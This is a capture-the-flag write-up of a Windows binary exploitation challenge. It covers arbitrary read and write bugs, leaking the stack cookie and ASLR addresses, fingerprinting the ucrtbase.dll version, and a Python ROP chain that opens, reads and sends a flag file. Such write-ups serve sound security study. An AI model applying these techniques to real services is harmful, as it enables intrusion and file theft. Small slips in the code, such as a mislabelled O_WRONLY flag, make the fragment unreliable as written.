# ACI Cyberstakes 2020: do_c_what_i_c

## The Challenge

This challenge was a 300pt Windows binary exploit.  The challenge grants you a copy of the do_you_c_what_i_c.exe file and access to a docker container running the service.  The hints indicate that stack cookies are in play and that some memory protections may be disabled.

**DISCLAIMER** I made a crucial erroneous assumption during this challenge.  Using a Windows variant of checksec, I saw that NX was enabled.

```bash
C:\Users\smitty\Desktop>winchecksec.exe do_you_c_what_I_c.exe
Dynamic Base    : true
ASLR            : true
High Entropy VA : false
Force Integrity : false
Isolation       : true
NX              : true
SEH             : true
CFG             : false
RFG             : false
SafeSEH         : false
GS              : false
Authenticode    : false
.NET            : true
```

So I assumed it'd be enabled on the target system.  All of my exploitation work below relied on that (false) assumption.  Another solution to this challenge could have just placed executable code on the stack and been horrendously easier.

I also assumed we'd be dealing with ASLR.  (This assumption was correct.)

The target binary is a 32-bit exe file that's purpose is to help the user remember numbers.  It allows the user to write hex encoded numbers to indexed memory positions in a buffer that is sized to hold 256 4-byte values.  The program allows reading from the buffer and sends output in hex encoded strings.  The program is console based and uses a simple menu system to allow the user to select between the write and read functions.

![alt tag](https://raw.githubusercontent.com/psmitty7373/ctf-writeups/master/ACI-CS-2020/do_you_c_what_i_c/01.png)

The ultimate goal is to obtain a copy of a flag.txt file that is located in d:\.  The majority of the work of the program is done in two functions.  The first I labelled "listener" which runs the listener socket and accepts incoming connections.  The second I labelled "connection handler" which does the job of receiving user input, processing input / output to the number buffer, and returning data to the user via the socket connection.

## The vulnerabilities

The program allows writes and reads to memory based on the address of the number buffer.  It allows this by converting user input to an integer and calculating a 4-byte offset from the start of the buffer.  There are two flaws here.  First, during writes, the program only restricts the user input to values less than 255 and does not properly restrict negative values.  The allows arbitrary writing of values above the buffer in the stack.  Second, the program does not restrict reads at all, and allows arbitrary reads.

This picture shows the code responsible for the arbitrary read:
![alt tag](https://raw.githubusercontent.com/psmitty7373/ctf-writeups/master/ACI-CS-2020/do_you_c_what_i_c/02.png)

And this, the limited write:
![alt tag](https://raw.githubusercontent.com/psmitty7373/ctf-writeups/master/ACI-CS-2020/do_you_c_what_i_c/03.png)

Finally, the program also had a buffer overflow in the write function with the buffer used to hold the user's value they wished to store.  This would allow you to overwrite EIP and a few more values on the stack.

## Lost

My false assumption about NX protection led me down some windy paths to nowhere.  First, I considered exploiting the Structured Exception Handler chain.  But those values were too far down the stack to overwrite with our limited write capability.  Next, I considered using the restricted write and format strings and calls to printf to create a fully arbitrary write.  This was partially successful.  I was able to use negative offsets on the write function to overwrite the format string.  The only problem was that it turns out Windows disables the "%n" operator by default for safety.

## The Hard Way

Finally, I settled on a course of action.  I would use ROP to open the flag in "d:\flag.txt" and read it into the number buffer, and send it via the socket.  I would use the functions _sopen_s and _read from the uartbase.dll.  These functions are particularly nice because they behave like standard POSIX open / read functions and use numbered file handles.  I would store the ROP chain in the number buffer and use the buffer overflow to gain control of EIP and repair the stack cookie with the arbitrary read.

# Part 1.  Stack Cookie
The stack in this program is protected with a cookie and exception handlers.  Reading the cookie is fairly easy with the read functionality of the program.  Using a simple loop you can dump stack values until you find the return value for the function on the stack (index 287).  The saved base pointer (index 286) and cookie (index 285) are just above that on the stack.  See below:

![alt tag](https://raw.githubusercontent.com/psmitty7373/ctf-writeups/master/ACI-CS-2020/do_you_c_what_i_c/04.png)

I used python and pwntools to script dumping these values.  You can find the code for that in this folder (named pwnit.py).

# Part 2.  ASLR
To store the ROP chain in the number buffer and accurately jump to it with the overflow, I would need to know the address of the number buffer.  Surprisingly to me, the stack size of the parent function (which I named listener) was wildly variable.  I struggled to accurately calculate the memory address of the buffer.  I ended up making a function to search for saved return addresses of both the connection handler and listener functions, grab the stored stack base pointers, and calculate the difference to find the stack size of the listener.  With those values, I could accurately calculate the offset to the number buffer.  The formula was: (listener_stack_size + connection_handler_saved_base_address) = connection_handler_stack_base_address.

# Part 3. ucrtbase.dll
**WARNING** This method won't always work.  I can't believe it did.  I got lucky? **WARNING**

My next struggle was that thanks to ASLR and Windows versioning I would need to know the base address and version of the ucrtbase.dll on the target system.  The program already imported several functions from ucrtbase.dll including the function _initterm.  Using our arbitrary read, I could get get the address to _initterm from the programs import address table:

![alt tag](https://raw.githubusercontent.com/psmitty7373/ctf-writeups/master/ACI-CS-2020/do_you_c_what_i_c/05.png)

I spent many hours trying to dump the correct version of the target ucrtbase.dll file.  Always failing.  The server seemed to have a timer that would kill the program after a few minutes (seconds).  Instead I went to a very dark place.  You know those sites that pop up on your search when you look for dll names on google?  The ones offering you dll files for download?  Yeah, I went there.  Specifically I went to dllme.com.  They had 41 versions of ucrtbase.dll.  I only need to find one where the offsets made sense with the address I got from dumping the remote _initterm address.  It took like 39 tries, but I finally found one that made sense.

![alt tag](https://raw.githubusercontent.com/psmitty7373/ctf-writeups/master/ACI-CS-2020/do_you_c_what_i_c/06.png)

This is kinda how that played out.  I would use the arbitrary read, and grab the current IAT address for _initterm.  I would get a value like: _initterm_addr: 0x7656b4a0. I would then use a program called "DLL Export Viewer" to check the offset for _initterm in one of the random ucrtbase.dll versions I got from dllme.  

![alt tag](https://raw.githubusercontent.com/psmitty7373/ctf-writeups/master/ACI-CS-2020/do_you_c_what_i_c/07.png)

This would give a value like 0x26ca0 that you see above.  Subtract this offset from the one we obtained from the remote program to calculate a dll base address.  In this case you'd get: 0x76544800.  This value doesn't make "sense" because Windows allocates 4kb pages.  So you'd expect to end up with a values like these:

![alt tag](https://raw.githubusercontent.com/psmitty7373/ctf-writeups/master/ACI-CS-2020/do_you_c_what_i_c/08.png)

After trying many versions of ucrtbase.dll to find one where the offsets made sense with the values in the programs IAT, I finally found ucrtbase.dll version 10.0.14393.0.  This one had _initterm at an offset of 0x3a4a0.  0x7656b4a0 - 0x3a4a0 = 0x76531000.  Money.  Note, you would want to check more than one function to better improve your chances of signaturing the right version of the dll.

Once I had the right dll, I could calculate the function offset address to any function in it.  I already said I'd like to open and read the flag file, so I chose to look up _sopen_s and _read which were at offsets 0x3df10 and 0x28980 respectively.

# Part 4. ROP

**CAVEAT** I am a ROP poser.  So please feel free to destroy my pitiful excuse for ROP **CAVEAT**

Next I started building the actual ROP chain.  It basically goes like this.

1. Use _sopen_s to open "d:\flag.txt"
2. Use _read to read the contents onto the stack in the number buffer
3. Write the bytes from the number buffer to the socket

This is a more in-depth breakdown of how I accomplished this:  The following notes reference the code block below and in pwnit.py.

1. I needed a place to put all this and get the stack pointed there.  The prime candidate was the number buffer.  I just had to get the stack pointed there.  Using the limited buffer overflow, I used a probably awful method of calling "pop ebp; ret" then "mov ebp; pop ebp; ret".  This can be found in many functions, I just used the one from the connection handler function.  This let me set the stack pointer to the top of the number buffer where I positioned the remainder of the ROP chain.

2. I allocated part of my dual/code stack number buffer as string / flag storage.  That would be at offset 0xdc in the buffer.

3. & 4. Using the number-buffer as a dual code/stack segment I used a "add esp, 28; ret" gadget as the return for calls to _sopen_s and _read.  Then positioned the function addresses and their arguments in stack order.

5. The send function call in the connection handler function seemed like a good way to send our flag.  I just used its address and set up the parameters needed to call it.  The only trick was that during the overflow the socket number was stored in the ECX register.  This gets blown away.  Luckily, for some odd reason, the socket number was stored like 30+ times on the stack in back-to-back.  I used the arbitrary read to grab that up.

6. This function call handles writing all our ROP nonsense to the buffer.

7. This payload is the buffer-overflow that kicks everything off.  It makes sure to re-write the stack cookie to prevent exceptions and handles pivoting the stack to the ROP chain living in the number buffer.
```python
# (2)
write(b'D:\\flag.txt\00', where=buf_addr + 0xdc) # store the file name in the number buffer at 0xdc

# (3)
# _sopen_s(int* fp, const char* fname, int oflag, int shflag, int pmode)
open_payload = struct.pack('<I', _sopen_s + _ucrtbase) + # _sopen_s address
	struct.pack('<I', add_esp_28) + # pivot to next function (_open) upon return
	struct.pack('<I', buf_addr + 0xe8) + # where to store the file pointer
	struct.pack('<I', buf_addr + 0xdc) + # file name
	struct.pack('<I', 0x0) + # open for read (O_WRONLY)
	struct.pack('<I', 0x40) + #  (_SH_DENYNO)
	struct.pack('<I', 0x0) + # no permissions 	
	b'\0' * 8 # padding

# (4)
# _read()
read_payload = struct.pack('<I', _read + _ucrtbase) + #  _read address
	struct.pack('<I', add_esp_28) + # pivot to next function (send)
	struct.pack('<I', 0x3) + # the file handle of the open flag.txt file
	struct.pack('<I', buf_addr + 0xdc) + # where to store the flag
	struct.pack('<I', 36) + # the length of the flag
	b'\0' * 16 # padding

# (5)
# send()
send_payload = struct.pack('<I', exe_base + 0x138b) + # return to the listener as normal
	struct.pack('<I', socket) +  # the socket
	struct.pack('<I', buf_addr + 0xdc) + # the flag string stored in the number buffer
	struct.pack('<I', 36) + # the length
	struct.pack('<I', 0x0) # flags

#(6)
# write the assembled rop chain to the buffer
write(open_payload + read_payload + send_payload, where=buf_addr + 64)

#(7)
# the assembled buffer oveflow with cookie and rop stack pivot
payload = b'a' * 0x10 +
	struct.pack('<I', conn_cookie) + # stack cookie (yum)
	b'ZZZZ' + struct.pack('<I', pop_ebp_ret) + # junk
	struct.pack('<I', buf_addr + 60) + # the start of our ROP chain within the number buffer
	struct.pack('<I', mov_esp_pop_ret) + # stack pivot
	b'b'*256
```

# Part 5. The Result
*** Note: this is what the output looks like on a local run, not the real target***
```bash
found: 0x20122e at 287
conn ret at: 287
conn sbp: 0x1af874
stack cookie: 0xcc2b5c69
listen ret at: 506
listen sbp: 0x1af8bc
stack cookie: 0x2016e7
listen stack size: 0x36c
connection handler stack base address: 0x1af508
buf_addr: 0x1af090
socket: 0x11c
_initterm_addr: 0x76566ca0
_ucrtbase addr: 0x76540000
sending ROP chain
sending overflow
b'Enter operation:\n    1) Read\n    2) Write\n'
[*] Switching to interactive mode
Enter operation:
    1) Read
    2) Write
Index: ACI{random_aci_flag_letters_go_here}\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
```

Success.  Running this will reliably dump the flag back to the socket.

# Conclusion

Don't be like me.  Make sure the stack is actually not executable before going down this path.  I wasted a lot of time (but learned a lot) making this solution.






